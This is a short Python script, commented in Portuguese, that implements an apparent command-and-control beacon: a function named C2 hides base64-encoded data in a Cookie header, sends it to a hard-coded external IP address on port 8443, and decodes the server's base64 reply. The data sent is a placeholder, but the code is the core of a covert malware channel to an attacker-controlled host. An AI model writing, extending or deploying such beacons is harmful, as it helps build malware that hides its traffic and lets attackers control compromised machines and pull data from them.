import requests
from base64 import b64encode, b64decode

def C2(url, data):
    # Envia a requisição com os dados codificados
    response = requests.get(url, headers={'Cookie': b64encode(data).decode('utf-8')})
    
    # Verifica se a requisição foi bem-sucedida
    if response.status_code == 200:
        # Decodifica a resposta recebida
        print(b64decode(response.content).decode('utf-8'))
    else:
        print(f"Request failed with status code: {response.status_code}")

url = "http://3.20.135.129:8443"  # Substitua com a URL do servidor
data = bytes("C2 data", "utf-8")  # Dados a serem enviados ao servidor
C2(url, data)
